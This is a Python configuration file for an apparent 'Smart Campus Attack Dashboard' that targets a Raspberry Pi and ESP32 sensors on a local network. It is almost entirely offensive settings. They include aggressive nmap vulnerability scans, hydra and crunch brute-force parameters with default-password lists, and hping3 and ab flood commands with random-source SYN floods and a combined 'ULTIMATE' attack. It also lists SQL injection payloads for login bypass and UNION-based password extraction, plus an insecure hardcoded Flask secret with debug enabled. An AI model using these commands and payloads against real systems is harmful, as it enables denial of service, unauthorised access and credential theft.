"""
Configuration file for Smart Campus Attack Dashboard
Customize attack parameters and target settings here
"""

# Flask Configuration
FLASK_CONFIG = {
    'SECRET_KEY': 'change-this-to-something-very-secure',
    'DEBUG': True,
    'HOST': '0.0.0.0',
    'PORT': 5000
}

# Database Configuration
DATABASE_CONFIG = {
    'SQLALCHEMY_DATABASE_URI': 'sqlite:///attack_dashboard.db',
    'SQLALCHEMY_TRACK_MODIFICATIONS': False
}

# Smart Campus Target Configuration
SMART_CAMPUS_TARGETS = {
    'raspberry_pi': {
        'ip': '',
        'description': 'Main Raspberry Pi Controller',
        'services': ['ssh', 'http', 'ftp'],
        'ports': {
            'ssh': 22,
            'http': 80,
            'https': 443,
            'ftp': 21
        }
    },
    'esp32_1': {
        'ip': '192.168.1.101',
        'description': 'CSE BLOCK (A BLOCK)',
        'services': ['http'],
        'ports': {'http': 80}
    },
    'esp32_2': {
        'ip': '192.168.1.102',
        'description': 'ECE BLOCK (B BLOCK)',
        'services': ['http'],
        'ports': {'http': 80}
    },
    'esp32_3': {
        'ip': '192.168.1.103',
        'description': 'PARKING',
        'services': ['http'],
        'ports': {'http': 80}
    },
    'esp32_4': {
        'ip': '192.168.1.104',
        'description': 'GARDEN/PARK',
        'services': ['http'],
        'ports': {'http': 80}
    }
}

# Nmap Scan Configuration
NMAP_CONFIG = {
    'basic_scan': {
        'ports': '1-10000',
        'timing': '-T4',
        'options': '-sV -O'
    },
    'aggressive_scan': {
        'ports': '1-65535',
        'timing': '-T5',
        'options': '-A -sV -sC --script vuln'
    },
    'timeout': 300  # seconds
}

# Brute Force Configuration
BRUTE_FORCE_CONFIG = {
    'crunch': {
        'min_length': 4,
        'max_length': 12,
        'charset': 'abcdefghijklmnopqrstuvwxyz0123456789',
        'patterns': [
            '@@@@%%%%',  # 4 letters + 4 numbers
            '2024%%%%',  # Year-based
            'admin%%%',  # Admin prefix
            'pi%%%%',    # Pi prefix
            'raspberry%%%'  # Raspberry prefix
        ]
    },
    'hydra': {
        'threads': {
            'ssh': 16,
            'ftp': 16,
            'http': 16,
            'mysql': 4,
            'postgres': 4,
            'rdp': 4,
            'smb': 8
        },
        'timeout': 600,  # seconds
        'verbose': True,
        'fail_fast': True
    },
    'common_passwords': [
        'raspberry', 'pi', 'admin', 'password', '123456',
        '12345678', 'root', 'toor', 'admin123', 'raspberry123',
        'pi123', 'smartcampus', 'campus123', 'sensor123',
        'esp32', 'default', 'changeme', 'welcome', 'admin@123'
    ],
    'common_usernames': [
        'root', 'admin', 'pi', 'administrator', 'user',
        'ubuntu', 'guest', 'test', 'sensor', 'campus'
    ]
}

# DoS Attack Configuration
# Enhanced DoS Attack Configuration
DOS_CONFIG = {
    'default_duration': 60,  # seconds
    
    # Ultra-aggressive SYN flood
    'ultra_syn': {
        'tool': 'hping3',
        'threads': 100,
        'command': 'timeout {duration} hping3 -S --flood -V -p {port} -d 65495 --rand-source {target}',
        'description': 'Multi-threaded SYN flood with 100 parallel instances'
    },
    
    # Raw socket SYN (requires root/scapy)
    'raw_syn': {
        'tool': 'scapy',
        'description': 'Raw socket SYN flood with random source IPs',
        'requires_root': True
    },
    
    # Mega UDP flood
    'mega_udp': {
        'tool': 'socket',
        'threads': 50,
        'packet_size': 65507,  # Maximum UDP packet size
        'description': '50-thread UDP flood with maximum packet size'
    },
    
    # Nuclear HTTP flood
    'nuclear_http': {
        'tool': 'socket',
        'threads': 100,
        'requests_per_connection': 10,
        'description': '100-thread HTTP flood with persistent connections'
    },
    
    # Enhanced Slowloris
    'enhanced_slowloris': {
        'initial_sockets': 2000,
        'keep_alive_interval': 3,
        'new_sockets_per_cycle': 100,
        'description': 'Enhanced Slowloris with 2000 initial connections'
    },
    
    # Nuclear all-ports attack
    'nuclear': {
        'tool': 'hping3',
        'threads': 50,
        'target_ports': 65535,
        'description': 'Attacks ALL 65535 ports simultaneously',
        'confirmation_required': True,
        'confirmation_word': 'NUCLEAR'
    },
    
    # Ultimate DDoS (all attacks combined)
    'ultimate': {
        'attack_vectors': ['ultra_syn', 'mega_udp', 'nuclear_http', 'enhanced_slowloris'],
        'description': 'Combines ALL attack types simultaneously',
        'confirmation_required': True,
        'confirmation_word': 'ULTIMATE'
    },
    
    # Legacy attacks (kept for compatibility)
    'syn_flood': {
        'tool': 'hping3',
        'command': 'sudo hping3 -S -p {port} --flood -d 40000 {target}'
    },
    'udp_flood': {
        'tool': 'hping3',
        'command': 'hping3 --udp --flood -p {port} {target}'
    },
    'icmp_flood': {
        'tool': 'hping3',
        'command': 'hping3 --icmp --flood {target}'
    },
    'http_flood': {
        'tool': 'ab',
        'requests': 1000000,
        'concurrency': 1000,
        'command': 'ab -n {requests} -c {concurrency} http://{target}:{port}/'
    }
}

# Attack control settings
ATTACK_CONTROL = {
    'enable_ctrl_c_stop': True,
    'auto_cleanup': True,
    'kill_processes_on_stop': ['hping3', 'ab'],
    'show_statistics': True,
    'confirm_nuclear_attacks': True
}

# Performance settings
PERFORMANCE_CONFIG = {
    'max_threads_per_attack': 100,
    'thread_spawn_delay': 0.1,  # seconds
    'socket_timeout': 1,
    'connection_retry_limit': 3
}

# SQL Injection Configuration
SQL_INJECTION_CONFIG = {
    'authentication_bypass': [
        "admin' OR '1'='1",
        "admin' OR '1'='1' --",
        "admin' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 'x'='x",
        "admin' --",
        "admin' #",
        "' or 1=1--",
        "') or '1'='1--"
    ],
    'union_based': [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "1' UNION SELECT table_name,NULL FROM information_schema.tables--"
    ],
    'time_based': [
        "'; WAITFOR DELAY '00:00:05'--",
        "1' AND SLEEP(5)--",
        "1' AND BENCHMARK(5000000,MD5('test'))--"
    ],
    'data_extraction': [
        "' UNION SELECT username,password,email FROM users--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT @@version,NULL,NULL--"
    ],
    'target_parameters': [
        'id', 'user', 'username', 'search', 'query',
        'name', 'email', 'password', 'login'
    ]
}

# Attack Logging Configuration
LOGGING_CONFIG = {
    'log_directory': 'logs',
    'log_format': '[%(asctime)s] %(levelname)s: %(message)s',
    'date_format': '%Y-%m-%d %H:%M:%S',
    'max_log_size': 10485760,  # 10MB
    'backup_count': 5
}

# Security Settings
SECURITY_CONFIG = {
    'require_authentication': True,
    'session_timeout': 3600,  # seconds
    'max_failed_attempts': 5,
    'lockout_duration': 300,  # seconds
    'allowed_ips': [],  # Empty = allow all
}

# Attack Rate Limiting
RATE_LIMIT_CONFIG = {
    'enabled': True,
    'max_concurrent_attacks': 5,
    'cooldown_period': 10,  # seconds between attacks
}

# Dashboard Refresh Intervals (milliseconds)
REFRESH_INTERVALS = {
    'status_update': 5000,
    'attack_history': 10000,
    'scan_results': 15000
}

# Export Configuration
def get_config(config_name):
    """Get configuration dictionary by name"""
    configs = {
        'flask': FLASK_CONFIG,
        'database': DATABASE_CONFIG,
        'targets': SMART_CAMPUS_TARGETS,
        'nmap': NMAP_CONFIG,
        'brute_force': BRUTE_FORCE_CONFIG,
        'dos': DOS_CONFIG,
        'sql_injection': SQL_INJECTION_CONFIG,
        'logging': LOGGING_CONFIG,
        'security': SECURITY_CONFIG,
        'rate_limit': RATE_LIMIT_CONFIG,
        'refresh': REFRESH_INTERVALS
    }
    return configs.get(config_name, {})

# Validation function
def validate_target_ip(ip):
    """Validate IP address format"""
    import re
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        return all(0 <= int(part) <= 255 for part in parts)
    return False

# Get all target IPs as a list
def get_all_target_ips():
    """Return list of all configured target IPs"""
    return [target['ip'] for target in SMART_CAMPUS_TARGETS.values()]